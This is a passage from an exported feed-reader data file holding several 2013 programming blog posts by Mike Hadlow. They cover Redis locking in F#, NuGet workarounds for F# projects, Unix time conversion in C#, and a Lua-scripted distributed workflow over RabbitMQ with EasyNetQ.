border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum11\" style=\"color: #606060\">11:</span>Threading.Thread.Sleep(100)</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum12\" style=\"color: #606060\">12:</span>printfn<span style=\"color: #006080\">\"Disposing of lock for %i\"</span>n</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum13\" style=\"color: #606060\">13:</span><span style=\"color: #0000ff\">lock</span>.Dispose()</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum14\" style=\"color: #606060\">14:</span>}</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum15\" style=\"color: #606060\">15:</span> </pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum16\" style=\"color: #606060\">16:</span>let ``should be able to save and retrieve from redis`` () =</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum17\" style=\"color: #606060\">17:</span></pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum18\" style=\"color: #606060\">18:</span>[<span style=\"color: #0000ff\">for</span>i<span style=\"color: #0000ff\">in</span>[0..9] -&gt; iTakeALock i]</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum19\" style=\"color: #606060\">19:</span>|&gt; Async.Parallel</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum20\" style=\"color: #606060\">20:</span>|&gt; Async.RunSynchronously</pre><!--CRLF--></div></div><p>The iTakeALock function creates an async task that uses the SeviceStack.Redis AquireLock function. It then pretends to do some work (Thread.Sleep(100)), and then releases the lock (lock.Dispose()).</p><p>Running 10 iTakeALocks in parallel (line 16 onwards) gives the following result:</p><div id=\"codeSnippetWrapper\"><pre id=\"codeSnippet\" style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\">Aquired<span style=\"color: #0000ff\">lock</span><span style=\"color: #0000ff\">for</span>2<br />Disposing of<span style=\"color: #0000ff\">lock</span><span style=\"color: #0000ff\">for</span>2<br />Aquired<span style=\"color: #0000ff\">lock</span><span style=\"color: #0000ff\">for</span>6<br />Disposing of<span style=\"color: #0000ff\">lock</span><span style=\"color: #0000ff\">for</span>6<br />Aquired<span style=\"color: #0000ff\">lock</span><span style=\"color: #0000ff\">for</span>0<br />Disposing of<span style=\"color: #0000ff\">lock</span><span style=\"color: #0000ff\">for</span>0<br />Aquired<span style=\"color: #0000ff\">lock</span><span style=\"color: #0000ff\">for</span>7<br />Disposing of<span style=\"color: #0000ff\">lock</span><span style=\"color: #0000ff\">for</span>7<br />Aquired<span style=\"color: #0000ff\">lock</span><span style=\"color: #0000ff\">for</span>9<br />Disposing of<span style=\"color: #0000ff\">lock</span><span style=\"color: #0000ff\">for</span>9<br />Aquired<span style=\"color: #0000ff\">lock</span><span style=\"color: #0000ff\">for</span>5<br />Disposing of<span style=\"color: #0000ff\">lock</span><span style=\"color: #0000ff\">for</span>5<br />Aquired<span style=\"color: #0000ff\">lock</span><span style=\"color: #0000ff\">for</span>3<br />Disposing of<span style=\"color: #0000ff\">lock</span><span style=\"color: #0000ff\">for</span>3<br />Aquired<span style=\"color: #0000ff\">lock</span><span style=\"color: #0000ff\">for</span>8<br />Disposing of<span style=\"color: #0000ff\">lock</span><span style=\"color: #0000ff\">for</span>8<br />Aquired<span style=\"color: #0000ff\">lock</span><span style=\"color: #0000ff\">for</span>1<br />Disposing of<span style=\"color: #0000ff\">lock</span><span style=\"color: #0000ff\">for</span>1<br />Aquired<span style=\"color: #0000ff\">lock</span><span style=\"color: #0000ff\">for</span>4<br />Disposing of<span style=\"color: #0000ff\">lock</span><span style=\"color: #0000ff\">for</span>4</pre><br /></div><p></p><p>Beautifully serialized access from parallel processes. Very nice.</p>","author":"Mike Hadlow","_id":{"$wrap":"$oid","v":1002}}
{"k":"0000000084","o":"0000005846","v":"001"}
{"_id":1003,"_uid":1003,"_dt":1373741607083,"_s":"f75ffcdc4b9d6c0803a4c1a871b5123c"}
{"subscription":{"$wrap":"$oid","v":14},"link":"http://feedproxy.google.com/~r/CodeRant/~3/D4Aeyrzb0x4/guest-post-working-around-fnuget.html","title":"Guest Post: Working Around F#/NuGet Problems","published":{"$wrap":"$date","v":1371554400000,"h":"2013-06-18T11:20:00.000Z"},"starred":false,"read":false,"content":"<p>A first for me. A guest post by my excellent colleague Michael Newton.</p><p>Michael normally blogs at<a href=\"http://blog.mavnn.co.uk\">http://blog.mavnn.co.uk</a>and works at<a href=\"http://15below.com\">15below</a>. He’s the build manager at 15below and has developed various work arounds for the F# NuGet issues we’ve been experiencing. I’ll hand over and let him explain …</p><p>In his<a href=\"http://mikehadlow.blogspot.co.uk/2013/06/nuget-install-is-broken-with-f.html\">first post</a>Mike did an excellent job explaining the bugs we found when trying to add or update NuGet references in fsproj files.</p><p>Unfortunately, the confusion doesn’t stop there. It turns out that if you examine the NuGet code, the logic for updating project files is not in NuGet.Core (the shared dll that drives core functionality like how to unpack a nupkg file) but is re-implemented in each client. This means that you get different results if you are running commands from the command line client than if you are using the Visual Studio plugin or the hosted PowerShell console. The reason for this starts to become obvious once you realise that the command line client has no parameters for specifying which project and/or solution you are working against, whilst that information is either already available in the Visual Studio plugin or required via little dropdown boxes in the hosted PowerShell console.</p><p>So, between everyday usage, preparing<a href=\"http://blog.mavnn.co.uk/coding-hygiene-moving-from-project-references-to-nuget-dependencies/\">to move some of our project references to NuGet</a>and the needs of our continuous integration we now had the following requirements:</p><ol><li>Reliable installation of NuGet references to C#, VB.net and F# projects. Preferably with an option of doing it via the command line to help scripting the project reference to NuGet reference moves.</li><li>Reliable upgrades of NuGet references in all project types. Again, a command line option would be useful.</li><li>Reliable downgrades of NuGet references in all project types. It’s painful to try a new release/pre-release of a NuGet package across a solution and then discover that you have to manually downgrade all of the projects separately if you decide not to take the new version.</li><li>Reliable removal of NuGet references turns out to be a requirement of reliable downgrades.</li><li>Sane solution wide management of references. Due to the way project references work, we need an easy way to ensure that all of the projects in a solution use the same version of any particular NuGet reference, and to check that this will not case any version conflicts. So ideally, upgrade and downgrade commands will run against a solution.</li></ol><p>Looking at our requirements in terms of what is already handled by NuGet and what is affected by the bugs that Mike discussed last time, we get:</p><ol><li>Very buggy for F# projects, fix relies on a fix to the underlying F# project type which is probably unlikely before Visual Studio version next. Also, command line installing that adds project references is not supported in nuget.exe by design.</li><li>Again, broken for F# projects. Otherwise works.</li><li>Not supported by design in any of the NuGet clients.</li><li>Appears to work.</li><li>Not supported by NuGet.</li></ol><p>As we looked at the list, it became apparent that we were unlikely to see the F# bug fixed any time soon, and even if we did there would still be several areas of functionality that we would be missing but would help us greatly. The number of options that we needed that the mainline NuGet project does not support by design swung the balance for us from a work-around or bug patch in NuGet’s Visual Studio project handling to a full blown wrapper library.</p><p>So, the<a href=\"https://github.com/mavnn/NuGetPlus\">NuGetPlus project</a>was born. As always, the name is a misnomer. Because<a href=\"http://martinfowler.com/bliki/TwoHardThings.html\">naming things is hard</a>. But the idea is to build a NuGet wrapper that provides the functionality above, and as a bonus extra for both us and the F# community, does not exhibit the annoying F# bugs from the previous post. Because the command line exe in NuGetPlus is only a very thin wrapper around the dll, it also allows you to easily call into the process from code and achieve results the same as running the command line program without having to write 100s of lines of supporting boiler plate. For those of you who have tried to use NuGet.Core directly, you’ll know that it’s a bit of an exercise in frustration actually mimicking the full behaviour of any of the clients.</p><p>It is very much still a work in progress. For example, it respects nuget.config files, but at the moment only makes use of the repository path and source list config options – we haven’t checked if we need to be supporting more. But it covers scenarios 1-4 above nicely, and we’re hoping to add 5 (solution level upgrade, downgrade and checking) fairly shortly. Although it has been developed on work time as functionality we desperately need in house, it is also a fully open source MIT licensed project that we are more than happy to receive pull requests for if there is functionality the community needs.</p><p>So whether you’re a F# NuGet user, or you just see the value of the additional functionality above, take it for a spin and let us know what you think.</p>","author":"Mike Hadlow","_id":{"$wrap":"$oid","v":1003}}
{"k":"0000000084","o":"0000004983","v":"001"}
{"_id":1004,"_uid":1004,"_dt":1373741607084,"_s":"4068e10c60b5ed568c29d7736d3cc2aa"}
{"subscription":{"$wrap":"$oid","v":14},"link":"http://feedproxy.google.com/~r/CodeRant/~3/6NOQjtpe1Eg/converting-between-unix-time-and.html","title":"Converting Between Unix Time And DateTime","published":{"$wrap":"$date","v":1358350260000,"h":"2013-01-16T15:31:00.000Z"},"starred":false,"read":false,"content":"<p><a href=\"http://en.wikipedia.org/wiki/Unix_time\">Unix time</a>is the time value used in Unix based operating systems and is often exposed by Unix based APIs. To convert it to, or from, a .NET System.DateTime simply calculate the number of seconds since the Unix Epoch, midnight on the 1st January 1970. I’ve created a little class you can use to do just that. Note that the Unix Epoch is UTC, so you should always convert your local time to UTC before doing the calculation.</p><div id=\"codeSnippetWrapper\"><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family:'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\" id=\"codeSnippet\"><span style=\"color: #0000ff\">public</span><span style=\"color: #0000ff\">class</span>UnixTime<br />{<br /><span style=\"color: #0000ff\">private</span><span style=\"color: #0000ff\">static</span><span style=\"color: #0000ff\">readonly</span>DateTime epoch =<span style=\"color: #0000ff\">new</span>DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);<br /><br /><span style=\"color: #0000ff\">public</span><span style=\"color: #0000ff\">static</span><span style=\"color: #0000ff\">long</span>FromDateTime(DateTime dateTime)<br />{<br /><span style=\"color: #0000ff\">if</span>(dateTime.Kind == DateTimeKind.Utc)<br />{<br /><span style=\"color: #0000ff\">return</span>(<span style=\"color: #0000ff\">long</span>)dateTime.Subtract(epoch).TotalSeconds;<br />}<br /><span style=\"color: #0000ff\">throw</span><span style=\"color: #0000ff\">new</span>ArgumentException(<span style=\"color: #006080\">\"Input DateTime must be UTC\"</span>);<br />}<br /><br /><span style=\"color: #0000ff\">public</span><span style=\"color: #0000ff\">static</span>DateTime ToDateTime(<span style=\"color: #0000ff\">long</span>unixTime)<br />{<br /><span style=\"color: #0000ff\">return</span>epoch.AddSeconds(unixTime);<br />}<br /><br /><span style=\"color: #0000ff\">public</span><span style=\"color: #0000ff\">static</span><span style=\"color: #0000ff\">long</span>Now<br />{<br />get<br />{<br /><span style=\"color: #0000ff\">return</span>FromDateTime(DateTime.UtcNow);<br />}<br />}<br />}</pre><br /></div><p>You can convert from Unix time to a UTC DateTime like this:</p><div id=\"codeSnippetWrapper\"><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family:'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\" id=\"codeSnippet\"><span style=\"color: #0000ff\">var</span>calculatedCurrentTime = UnixTime.ToDateTime(currentUnixTime);</pre><br /></div><p>Convert to Unix time from a UTC DateTime like this:</p><div id=\"codeSnippetWrapper\"><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family:'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\" id=\"codeSnippet\"><span style=\"color: #0000ff\">var</span>calculatedUnixTime = UnixTime.FromDateTime(myDateTimeValue);</pre><br /></div><p>And get the current time as a UTC time value like this:</p><div id=\"codeSnippetWrapper\"><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family:'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\" id=\"codeSnippet\">Console.Out.WriteLine(UnixTime.Now);</pre></div><div> </div><div>As an interesting aside, the 32 bit signed integer used in older Unix systems will overflow at 14 minutes past 3 o’clock and 7 seconds on the morning of 19th January 2038 and interpret the date as 1901. I shall come out of retirement and spend happy well paid hours as a ‘unix time consultant’. 64 bit systems will overflow in the year 292,277,026,596.</div>","author":"Mike Hadlow","_id":{"$wrap":"$oid","v":1004}}
{"k":"0000000084","o":"0000015032","v":"001"}
{"_id":1005,"_uid":1005,"_dt":1373741607084,"_s":"389dff4614ffc9ed8e202fb18f3fca5a"}
{"subscription":{"$wrap":"$oid","v":14},"link":"http://feedproxy.google.com/~r/CodeRant/~3/0D3_2Hjtb4U/lua-as-distributed-workflow-scripting.html","title":"Lua as a Distributed Workflow Scripting Language","published":{"$wrap":"$date","v":1365089940000,"h":"2013-04-04T15:39:00.000Z"},"starred":false,"read":false,"content":"<p>I’ve been spending a lot of time recently thinking about ways of orchestrating long running workflows in a service oriented architecture. I was talking this over at last Tuesday’s<a href=\"http://brightonalt.net/\">Brighton ALT NET</a>when<a href=\"https://twitter.com/jaykannan\">Jay Kannan</a>, who’s a game developer amongst other things, mentioned that<a href=\"http://www.lua.org/\">Lua</a>is a popular choice for scripting game platforms. Maybe I should check it out. So I did. And it turns out to be very interesting.</p><p>If you haven’t heard of Lua, it’s a “powerful, fast, lightweight, embeddable scripting language” originally conceived by a team at the Catholic University of Rio de Janeiro in Brazil. It’s the leading scripting language for game platforms and also pops up in other interesting locations including Photoshop and<a href=\"http://blog.wikimedia.org/2013/03/14/what-lua-scripting-means-wikimedia-open-source/\">Wikipedia</a>. It’s got a straightforward C API that makes it relatively simple to p-invoke from .NET, and indeed there’s a<a href=\"http://luaforge.net/projects/luainterface/\">LuaInterface</a>library that provides a managed API.</p><p>I got the source code from the<a href=\"https://code.google.com/p/luainterface/\">Google code svn repository</a>and built it in VS 2012, but there are NuGet packages available as well.</p><p>It turned out to be very simple to use Lua to script a distributed workflow. Lua has<a href=\"http://www.lua.org/manual/5.2/manual.html#2.6\">first class coroutines</a>which means that you can pause and continue a Lua script at will. The LuaInterface library allows you inject C# functions and call them as Lua functions, so it’s simply a case of calling an asynchronous C# ‘begin’ function, suspending the script by yielding the coroutine, waiting for the asynchronous function to return, setting the return value, and starting up the script again.</p><p>Let me show you how.</p><p>First here’s a little Lua script:</p><div id=\"codeSnippetWrapper\"><pre id=\"codeSnippet\" style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\">a = 5<br />b = 6<br /><br />print(<span style=\"color: #006080\">'doing remote add ...'</span>)<br /><br />r1 = remoteAdd(a, b)<br /><br />print(<span style=\"color: #006080\">'doing remote multiply ...'</span>)<br /><br />r2 = remoteMultiply(r1, 4)<br /><br />print(<span style=\"color: #006080\">'doing remote divide ...'</span>)<br /><br />r3 = remoteDivide(r2, 2)<br /><br />print(r3)</pre><br /></div><p>The three functions ‘remoteAdd’, ‘remoteMultiply’ and ‘remoteDivide’ are all asynchronous. Behind the scenes a message is sent via RabbitMQ to a remote OperationServer where the calculation is carried out and a message is returned.</p><p>The script runs in my LuaRuntime class. This creates and sets up the Lua environment that the script runs in:</p><div id=\"codeSnippetWrapper\"><pre id=\"codeSnippet\" style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span style=\"color: #0000ff\">public</span><span style=\"color: #0000ff\">class</span>LuaRuntime : IDisposable<br />{<br /><span style=\"color: #0000ff\">private</span><span style=\"color: #0000ff\">readonly</span>Lua lua =<span style=\"color: #0000ff\">new</span>Lua();<br /><span style=\"color: #0000ff\">private</span><span style=\"color: #0000ff\">readonly</span>Functions functions =<span style=\"color: #0000ff\">new</span>Functions();<br /><br /><span style=\"color: #0000ff\">public</span>LuaRuntime()<br />{<br />lua.RegisterFunction(<span style=\"color: #006080\">\"print\"</span>, functions,<span style=\"color: #0000ff\">typeof</span>(Functions).GetMethod(<span style=\"color: #006080\">\"Print\"</span>));<br />lua.RegisterFunction(<span style=\"color: #006080\">\"startOperation\"</span>,<span style=\"color: #0000ff\">this</span>, GetType().GetMethod(<span style=\"color: #006080\">\"StartOperation\"</span>));<br /><br />lua.DoString(<br /><span style=\"color: #006080\">@\"<br />function remoteAdd(a, b) return remoteOperation(a, b, '+'); end<br />function remoteMultiply(a, b) return remoteOperation(a, b, '*'); end<br />function remoteDivide(a, b) return remoteOperation(a, b, '/'); end<br /><br />function remoteOperation(a, b, op)<br />startOperation(a, b, op)<br />local cor = coroutine.running()<br />coroutine.yield(cor)<br /><br />return LUA_RUNTIME_OPERATION_RESULT<br />end<br />\"</span>);<br />}<br /><br /><span style=\"color: #0000ff\">public</span><span style=\"color: #0000ff\">void</span>StartOperation(<span style=\"color: #0000ff\">int</span>a,<span style=\"color: #0000ff\">int</span>b,<span style=\"color: #0000ff\">string</span>operation)<br />{<br />functions.RunOperation(a, b, operation, result =&gt;<br />{<br />lua[<span style=\"color: #006080\">\"LUA_RUNTIME_OPERATION_RESULT\"</span>] = result;<br />lua.DoString(<span style=\"color: #006080\">\"coroutine.resume(co)\"</span>);<br />});<br />}<br /><br /><span style=\"color: #0000ff\">public</span><span style=\"color: #0000ff\">void</span>Execute(<span style=\"color: #0000ff\">string</span>script)<br />{<br /><span style=\"color: #0000ff\">const</span><span style=\"color: #0000ff\">string</span>coroutineWrapper =<br /><span style=\"color: #006080\">@\"co = coroutine.create(function()<br />{0}<br />end)\"</span>;<br />lua.DoString(<span style=\"color: #0000ff\">string</span>.Format(coroutineWrapper, script));<br />lua.DoString(<span style=\"color: #006080\">\"coroutine.resume(co)\"</span>);<br />}<br /><br /><span style=\"color: #0000ff\">public</span><span style=\"color: #0000ff\">void</span>Dispose()<br />{<br />lua.Dispose();<br />functions.Dispose();<br />}<br />}</pre><br /></div><p>When this class is instantiated it creates a new LuaInterface environment (the Lua class) and a new instance of a Functions class that I’ll explain below.</p><p>The constructor is where most of the interesting setup happens. First we register two C# functions that we want to call from inside Lua: ‘print’ which simply prints from the console, and ‘startOperation’ which starts an asynchronous math operation.</p><p>Next we define our three functions: ‘remoteAdd’, ‘remoteMultiply’ and ‘remoteDivide’ which all in turn invoke a common function ‘remoteOperation’. RemoteOperation calls the registered C# function ‘startOperation’ then yields the currently running coroutine. Effectively the script will stop here until it’s started again. After it starts, the result of the asynchronous operation is accessed from the  LUA_RUNTIME_OPERATION_RESULT variable and returned to the caller.</p><p>The C# function StartOperation calls RunOperation on our Functions class which has an asynchronous callback. In the callback we set the result value in the Lua environment and execute ‘coroutine.resume’ which restarts the Lua script at the point where it yielded.</p><p>The Execute function actually runs the script. First it embeds it in a ‘coroutine.create’ call so that the entire script is created as a coroutine, then it simply starts the coroutine by calling ‘coroutine.resume’.</p><p>The Functions class is just a wrapper around a function that maintains an<a href=\"http://easynetq.com\">EasyNetQ</a>connection to RabbitMQ and makes an EasyNetQ request to a remote server somewhere else on the network.</p><div id=\"codeSnippetWrapper\"><pre id=\"codeSnippet\" style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span style=\"color: #0000ff\">public</span><span style=\"color: #0000ff\">class</span>Functions : IDisposable<br />{<br /><span style=\"color: #0000ff\">private</span><span style=\"color: #0000ff\">readonly</span>IBus bus;<br /><br /><span style=\"color: #0000ff\">public</span>Functions()<br />{<br />bus = RabbitHutch.CreateBus(<span style=\"color: #006080\">\"host=localhost\"</span>);<br />}<br /><br /><span style=\"color: #0000ff\">public</span><span style=\"color: #0000ff\">void</span>Dispose()<br />{<br />bus.Dispose();<br />}<br /><br /><span style=\"color: #0000ff\">public</span><span style=\"color: #0000ff\">void</span>RunOperation(<span style=\"color: #0000ff\">int</span>a,<span style=\"color: #0000ff\">int</span>b,<span style=\"color: #0000ff\">string</span>operation, Action&lt;<span style=\"color: #0000ff\">int</span>&gt; resultCallback)<br />{<br /><span style=\"color: #0000ff\">using</span>(var channel = bus.OpenPublishChannel())<br />{<br />var request =<span style=\"color: #0000ff\">new</span>OperationRequest()<br />{<br />A = a,<br />B = b,<br />Operation = operation<br />};<br />channel.Request&lt;OperationRequest, OperationResponse&gt;(request, response =&gt;<br />{<br />Console.WriteLine(<span style=\"color: #006080\">\"Got response {0}\"</span>, response.Result);<br />resultCallback(response.Result);<br />});<br />}<br />}<br /><br /><span style=\"color: #0000ff\">public</span><span style=\"color: #0000ff\">void</span>Print(<span style=\"color: #0000ff\">string</span>msg)<br />{<br />Console.WriteLine(<span style=\"color: #006080\">\"LUA&gt; {0}\"</span>, msg);<br />}<br />}</pre></div><div> </div><div>Here’s a sample run of the script:</div><div> </div><div id=\"codeSnippetWrapper\"><pre id=\"codeSnippet\" style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\">DEBUG: Trying to connect<br />DEBUG: OnConnected<span style=\"color: #0000ff\">event</span>fired<br />INFO: Connected to RabbitMQ. Broker:<span style=\"color: #006080\">'localhost'</span>, Port: 5672, VHost:<span style=\"color: #006080\">'/'</span><br />LUA&gt; doing remote add ...<br />DEBUG: Declared Consumer. queue=<span style=\"color: #006080\">'easynetq.response.143441ff-3635-4d5d-8e42-6b379b3f8356'</span>, prefetchcount=50<br />DEBUG: Published to exchange:<span style=\"color: #006080\">'easy_net_q_rpc'</span>, routing key:<span style=\"color: #006080\">'Mike_DistributedLua_Messages_OperationRequest:Mike_DistributedLua_Messages'</span>, correlationId:<span style=\"color: #006080\">'50560dd9-2be1-49a1-96f6-9c62641080ae'</span><br />DEBUG: Recieved<br />RoutingKey:<span style=\"color: #006080\">'easynetq.response.143441ff-3635-4d5d-8e42-6b379b3f8356'</span><br />CorrelationId:<span style=\"color: #006080\">'50560dd9-2be1-49a1-96f6-9c62641080ae'</span><br />ConsumerTag:<span style=\"color: #006080\">'101343d9-9497-4893-88e6-b89cc1de29a4'</span><br />Got response 11<br />LUA&gt; doing remote multiply ...<br />DEBUG: Declared Consumer. queue=<span style=\"color: #006080\">'easynetq.response.f571f6d7-b963-4a88-bf62-f05785009e39'</span>, prefetchcount=50<br />DEBUG: Published to exchange:<span style=\"color: #006080\">'easy_net_q_rpc'</span>, routing key:<span style=\"color: #006080\">'Mike_DistributedLua_Messages_OperationRequest:Mike_DistributedLua_Messages'</span>, correlationId:<span style=\"color: #006080\">'0ea7e1c3-6f12-4cb9-a861-2f5de8f2600d'</span><br />DEBUG: Model Shutdown<span style=\"color: #0000ff\">for</span>queue:<span style=\"color: #006080\">'easynetq.response.143441ff-3635-4d5d-8e42-6b379b3f8356'</span><br />DEBUG: Recieved<br />RoutingKey:<span style=\"color: #006080\">'easynetq.response.f571f6d7-b963-4a88-bf62-f05785009e39'</span><br />CorrelationId:<span style=\"color: #006080\">'0ea7e1c3-6f12-4cb9-a861-2f5de8f2600d'</span><br />ConsumerTag:<span style=\"color: #006080\">'2c35f24e-7745-4475-885a-d214a1446a70'</span><br />Got response 44<br />LUA&gt; doing remote divide ...<br />DEBUG: Declared Consumer. queue=<span style=\"color: #006080\">'easynetq.response.060f7882-685c-4b00-a930-aa4f20f7c057'</span>, prefetchcount=50<br />DEBUG: Published to exchange:<span style=\"color: #006080\">'easy_net_q_rpc'</span>, routing key:<span style=\"color: #006080\">'Mike_DistributedLua_Messages_OperationRequest:Mike_DistributedLua_Messages'</span>, correlationId:<span style=\"color: #006080\">'ea9a90cc-cd7d-4f05-b171-c6849026ac4a'</span><br />DEBUG: Model Shutdown<span style=\"color: #0000ff\">for</span>queue:<span style=\"color: #006080\">'easynetq.response.f571f6d7-b963-4a88-bf62-f05785009e39'</span><br />DEBUG: Recieved<br />RoutingKey:<span style=\"color: #006080\">'easynetq.response.060f7882-685c-4b00-a930-aa4f20f7c057'</span><br />CorrelationId:<span style=\"color: #006080\">'ea9a90cc-cd7d-4f05-b171-c6849026ac4a'</span><br />ConsumerTag:<span style=\"color: #006080\">'90e6b024-c5c4-440a-abdf-cb9a000c131c'</span><br />Got response 22<br />LUA&gt; 22<br />DEBUG: Model Shutdown<span style=\"color: #0000ff\">for</span>queue:<span style=\"color: #006080\">'easynetq.response.060f7882-685c-4b00-a930-aa4f20f7c057'</span><br />Completed<br />DEBUG: Connection disposed</pre><br /></div><div>You can see the Lua print statements interleaved with EasyNetQ DEBUG statements showing the messages being published and consumed.</div><div> </div><div>So there you go, a distributed workflow scripting engine in under 100 lines of code. All I’ve got to do now is serialize the Lua environment at each yield and then restart it again from its serialized state. This is possible according to a bit of googling yesterday afternoon. Watch this space.</div><div> </div><div>You can find the code for all this on GitHub here:</div><div> </div><div><a href=\"https://github.com/mikehadlow/Mike.DistributedLua\">https://github.com/mikehadlow/Mike.DistributedLua</a></div>","author":"Mike Hadlow","_id":{"$wrap":"$oid","v":1005}}
{"k":"0000000084","o":"0000002953","v":"001"}
{"_id":1006,"_uid":1006,"_dt":1373741607085,"_s":"8ec56f640e45d6db4feecae52ad889d4"}
{"subscription":{"$wrap":"$oid","v":14},"link":"http://feedproxy.google.com/~r/CodeRant/~3/EKZZ3koif_4/easynetq-in-africa.html","title":"EasyNetQ in Africa","published":{"$wrap":"$date","v":1360147980000,"h":"2013-02-06T10:53:00.000Z"},"starred":false,"read":false,"content":"<p>Anthony Moloney got in touch with me recently. He’s using<a href=\"http://easynetq.com/\">EasyNetQ</a>, my simple .NET API for RabbitMQ, with his team in Kenya. Here’s an email he sent me:</p><blockquote><p><em>Hi Mike,</em></p><p><em>Further to the brief twitter exchange today about using EasyNetQ on our Kenyan project. We started using EasyNetQ back in early November and I kept meaning to drop you a line to thank you for all your good work.</em></p><p><em>Virtual City are based in Nairobi and supply mobile solutions to the supply chain and agribusiness industry in Africa. African solutions for African problems. I got involved with them about 2 years ago to help them improve the quality of their products and I have been working on and off with them since then. Its been a bit of a journey we are getting 